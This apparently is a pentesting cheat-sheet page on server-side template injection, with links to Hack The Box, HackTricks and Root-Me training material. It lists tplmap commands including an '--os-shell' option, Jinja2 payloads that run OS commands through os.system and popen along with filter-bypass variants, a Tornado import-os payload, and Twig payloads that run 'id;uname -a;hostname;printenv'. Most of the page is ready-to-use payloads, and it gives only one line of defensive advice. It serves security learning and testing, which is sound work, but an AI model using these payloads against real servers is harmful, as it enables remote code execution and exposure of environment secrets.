# Server-Side Template Injection (SSTI)

[![server_side_attacks](../../../../_badges/htb/server_side_attacks.svg)](https://academy.hackthebox.com/course/preview/server-side-attacks)
[![ssti_server_side_template_injection](../../../../_badges/hacktricks/pentesting_web/ssti_server_side_template_injection.svg)](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/)
[![ssti](../../../../_badges/poat/ssti.svg)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
[![java_ssti](../../../../_badges/rootme/web_server/java_ssti.svg)](https://www.root-me.org/en/Challenges/Web-Server/Java-Server-side-Template-Injection)

<div class="row row-cols-lg-2"><div>

Server-Side Template Injection occurs when we can inject code that is parsed by a template engine such as [Jinja2](/programming-languages/web/topics/templating/jinja2/index.md) in Python.

You may be able to guess the template engine used from the web server, for instance, if it's Python then it's most likely Jinja.

To guess the template engine, we can try every token (`${{<%[%'"}}%\`) with expressions such as `7*7` or `7*'7'` and look for the output/errors.

* [Port Swigger SSTI Decision Tree](https://portswigger.net/web-security/images/template-decision-tree.png)
* [Template Injection Table](https://cheatsheet.hackmanit.de/template-injection-table/)
</div><div>

There are a few tools you might use:

* [TInjA](https://github.com/Hackmanit/TInjA) <small>(0.2k ‚≠ê)</small>
* [sstimap](https://github.com/vladko312/sstimap) <small>(0.6k ‚≠ê)</small>
* [tplmap](https://github.com/epinna/tplmap) <small>(3.6k ‚≠ê, 2022 ü™¶)</small>

```ps
$ tplmap -u 'http://example.com:80/*'
$ tplmap -u 'http://example.com:80' -d 'xxx=yyy'
$ tplmap -u 'http://example.com:80' -d 'xxx=yyy' --os-shell
```
</div></div>

<hr class="sep-both">

## Well-Known Template Engines

<div class="row row-cols-lg-2"><div>

#### Jinja2 Template Engine ‚Äî Python

[![server_side_attacks](../../../../_badges/htb/server_side_attacks.svg)](https://academy.hackthebox.com/course/preview/server-side-attacks)
[![jinja2_ssti](../../../../_badges/hacktricks/pentesting_web/ssti_server_side_template_injection/jinja2_ssti.svg)](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti)
[![python_ssti_introduction](../../../../_badges/rootme/web_server/python_ssti_introduction.svg)](https://www.root-me.org/en/Challenges/Web-Server/Python-Server-side-Template-Injection-Introduction)

Refer to [JinJa2 Notes](/programming-languages/web/topics/templating/jinja2/index.md) if needed.

* Basic Fingerprint PoC: `{{ "PoC" }}` then `{{ "PoC"|e }}`
* Test for instructions: `{% debug %}` and `{% print("PoC") %}`
* Try to print the context `{{ self._TemplateReference__context }}`
* Then, you might try to perform a code injection:

```js!
{{ cycler.__init__.__globals__.os.system('ls') }}
{{ cycler.__init__.__globals__.os.popen("ls -1a").read() }}
{{ lipsum.__globals__.os.popen('ls -1a').read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').system('ls') }}
{{ request.application.__globals__.__builtins__.__import__('os').popen('ls -1a').read() }}
```

* To by-pass filters, refer to my [Python Cheatsheet](/cybersecurity/red-team/s3.exploitation/vulns/cheatsheet/payloads.md#python) and:

```js!
{{ cycler.__init__.__globals__.os.system('ls') }}
{{ cycler|attr('__init__')|attr('__gobals__')|attr('get')('os')|attr('system')('ls') }}
{{ cycler|attr('__in'+'it__')|[...] }}
{{ cycler|attr('__in'~'it__')|[...] }}
{{ cycler|attr(('@@in'~'it@@'|replace("@", "\u005F")))|[...] }}
```

* Never inject untrusted input in your template before rendering them. Always pass the input as parameters and use `{{ param|e }}` to avoid XSS. Flask automatically escape all parameters by default.

‚ö†Ô∏è Before, we were using longer payloads as [explained here](https://podalirius.net/en/publications/grehack-2021-optimizing-ssti-payloads-for-jinja2/).

</div><div>

#### Apache Velocity Template Engine ‚Äî Java

Link to the [official documentation](https://velocity.apache.org/).

* Basic PoC: `#set($s=7+7) $s`

<br>

#### Tornado Web Framework Templates ‚Äî Python

[![server_side_attacks](../../../../_badges/htb/server_side_attacks.svg)](https://academy.hackthebox.com/course/preview/server-side-attacks)

Link to the template section of the [official documentation](https://www.tornadoweb.org/en/stable/guide/templates.html).

```js!
{% import os %}{{os.popen('whoami').read()}}
```

<br>

#### Twig Template Engine ‚Äî PHP

[![server_side_attacks](../../../../_badges/htb/server_side_attacks.svg)](https://academy.hackthebox.com/course/preview/server-side-attacks)

Link to the [official documentation](https://twig.symfony.com/documentation). [GitHub](https://github.com/twigphp/Twig) <small>(8.0k ‚≠ê)</small>.

* Basic Fingerprint PoC: `{{_self}}`, `{{_self.env}}`
* Random payloads:

```js!
{{_self.env.display("TEST")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname;printenv")}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id;uname -a;hostname;printenv")}}
```

üìö Both `exec` and `system` are PHP functions.
</div></div>